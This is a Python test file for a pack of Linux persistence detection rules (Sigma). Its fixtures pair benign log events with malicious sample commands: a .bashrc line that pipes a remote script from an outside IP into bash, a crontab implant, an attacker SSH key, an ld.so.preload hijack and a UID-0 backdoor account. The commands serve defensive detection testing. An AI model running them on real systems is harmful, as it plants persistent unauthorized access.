"""Linux persistence Sigma pack: each example loads, matches its sample, and ignores a benign event."""

import unittest
from pathlib import Path

from watchpost import normalize, sigma

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "linux-persistence"
EXAMPLES = PACK.parent

# filename -> (attack technique tag, malicious event, benign event)
CASES = {
    "cron_spool_or_crontab_write.yml": (
        "attack.t1053.003",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "bash -c 'echo \"* * * * * /tmp/.upd\" | crontab -'"},
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "cron[842]: (root) CMD (run-parts /etc/cron.hourly)"},
    ),
    "systemd_service_unit.yml": (
        "attack.t1543.002",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "tee /etc/systemd/system/updater.service"},
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "systemctl status ssh.service"},
    ),
    "ssh_authorized_keys.yml": (
        "attack.t1098.004",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKey attacker@host' >> /root/.ssh/authorized_keys"},
        {"event_type": "process_start", "user": "alice", "host": "web01",
         "message": "cat /home/alice/.ssh/authorized_keys"},
    ),
    "shell_startup_file.yml": (
        "attack.t1546.004",
        {"event_type": "process_start", "user": "alice", "host": "web01",
         "message": "echo 'curl -fsSL http://203.0.113.9/a.sh | bash' >> /home/alice/.bashrc"},
        {"event_type": "process_start", "user": "alice", "host": "web01",
         "message": "sourcing /home/alice/.bashrc"},
    ),
    "ld_so_preload.yml": (
        "attack.t1574.006",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "echo /tmp/libevil.so > /etc/ld.so.preload"},
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "ldconfig: updating /etc/ld.so.cache"},
    ),
    "uid_zero_local_account.yml": (
        "attack.t1136.001",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysbackup"},
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "useradd -m -s /bin/bash alice"},
    ),
}


class LinuxPersistencePackTests(unittest.TestCase):
    def test_pack_files_match_cases(self):
        found = sorted(p.name for p in PACK.glob("*.yml"))
        self.assertEqual(found, sorted(CASES))

    def test_each_rule_loads_matches_and_ignores_benign(self):
        for name, (technique, malicious, benign) in CASES.items():
            with self.subTest(rule=name):
                text = (PACK / name).read_text()
                doc = sigma.parse_yaml(text)
                self.assertIn(technique, doc["tags"])
                compiled = sigma.compile_rule(text)
                self.assertTrue(compiled["rule_id"].startswith("sigma_"))
                self.assertTrue(sigma.matches(compiled["params"], malicious))
                self.assertFalse(sigma.matches(compiled["params"], benign))

    def test_titles_and_ids_are_unique_across_examples(self):
        titles, ids, rule_ids = [], [], []
        for path in sorted(EXAMPLES.rglob("*.yml")):
            doc = sigma.parse_yaml(path.read_text())
            compiled = sigma.compile_rule(path.read_text())
            titles.append(doc["title"])
            ids.append(doc["id"])
            rule_ids.append(compiled["rule_id"])
        self.assertEqual(len(titles), len(set(titles)))
        self.assertEqual(len(ids), len(set(ids)))
        self.assertEqual(len(rule_ids), len(set(rule_ids)))
        self.assertEqual(len(CASES), 6)



class LinuxPersistenceScopeTests(unittest.TestCase):
    """logsource does not filter, so each rule excludes web, firewall, network, and VPN events."""

    NOT_HOST = ("web_request", "web_scan", "web_error", "fw_deny", "fw_allow", "network_connection", "vpn_login")

    def test_web_and_firewall_lines_naming_persistence_paths_do_not_match(self):
        probes = {
            "cron_spool_or_crontab_write.yml": "GET /cgi-bin/x?f=/etc/crontab HTTP/1.1 404",
            "systemd_service_unit.yml": "GET /static/../../etc/systemd/system/ssh.service HTTP/1.1 400",
            "ssh_authorized_keys.yml": "GET /?q=echo%20key%20>>%20.ssh/authorized_keys HTTP/1.1 404",
            "shell_startup_file.yml": "GET /?cmd=echo%20x%20>>%20/root/.bashrc HTTP/1.1 404",
            "ld_so_preload.yml": "GET /?env=LD_PRELOAD=/tmp/x.so HTTP/1.1 404",
            "uid_zero_local_account.yml": "GET /?c=useradd%20-o%20-u 0%20x HTTP/1.1 404",
        }
        self.assertEqual(sorted(probes), sorted(CASES))
        for name, probe in probes.items():
            compiled = sigma.compile_rule((PACK / name).read_text())
            malicious = CASES[name][1]
            for event_type in self.NOT_HOST:
                with self.subTest(rule=name, event_type=event_type):
                    self.assertFalse(sigma.matches(compiled["params"], {
                        "event_type": event_type, "src_ip": "203.0.113.7", "host": "web01", "message": probe}))
                    # The same command text in a web or network event no longer matches either.
                    self.assertFalse(sigma.matches(compiled["params"], {**malicious, "event_type": event_type}))

    def test_host_event_types_still_match(self):
        for name, (_, malicious, _) in CASES.items():
            compiled = sigma.compile_rule((PACK / name).read_text())
            for event_type in ("process_start", "file_access", "privilege_escalation", "privilege_use",
                               "user_created", "syslog", "other"):
                with self.subTest(rule=name, event_type=event_type):
                    self.assertTrue(sigma.matches(compiled["params"], {**malicious, "event_type": event_type}))

    def test_auditd_and_shell_command_log_lines_still_fire(self):
        # These normalize to event_type "other": EXECVE has no exe= field and bash command logs have no pattern.
        lines = {
            "ld_so_preload.yml": 'Nov 20 10:00:00 web01 audit: type=EXECVE msg=audit(1763632800.123:42): '
                                 'argc=3 a0="env" a1="LD_PRELOAD=/tmp/x.so" a2="/usr/bin/id"',
            "ssh_authorized_keys.yml": 'Nov 20 10:00:00 web01 bash[100]: root: '
                                       'bash -c "echo k >> /root/.ssh/authorized_keys"',
            "uid_zero_local_account.yml": "Nov 20 10:00:00 web01 bash[100]: root: useradd -o -u 0 -g 0 sysbackup",
        }
        for name, line in lines.items():
            with self.subTest(rule=name):
                event = normalize.normalize_authlog_line(line, "authlog")
                self.assertEqual(event["event_type"], "other")
                compiled = sigma.compile_rule((PACK / name).read_text())
                self.assertTrue(sigma.matches(compiled["params"], event))
                self.assertEqual(len(sigma.run([{**event, "id": 1}], compiled["params"])), 1)

    def test_web_scan_probe_lines_through_the_web_parser_do_not_fire(self):
        probes = ("/etc/crontab", "/?env=LD_PRELOAD=/tmp/x.so", "/?c=useradd%20-o%20-u%200%20x",
                  "/?c=echo%20k%20%3E%3E%20.ssh/authorized_keys", "/../../etc/systemd/system/x.service",
                  "/?c=echo%20x%20%3E%3E%20.bashrc")
        events = []
        for probe in probes:
            line = (f'203.0.113.7 - - [20/Nov/2026:10:00:00 +0000] "GET {probe} HTTP/1.1" 404 153 "-" '
                    '"Mozilla/5.0 (compatible; Nmap Scripting Engine)"')
            event = normalize.normalize_weblog_line(line, "weblog")
            self.assertIn(event["event_type"], self.NOT_HOST, line)
            events.append(event)
        for name in CASES:
            compiled = sigma.compile_rule((PACK / name).read_text())
            for event in events:
                with self.subTest(rule=name, message=event["message"][:60]):
                    self.assertFalse(sigma.matches(compiled["params"], event))
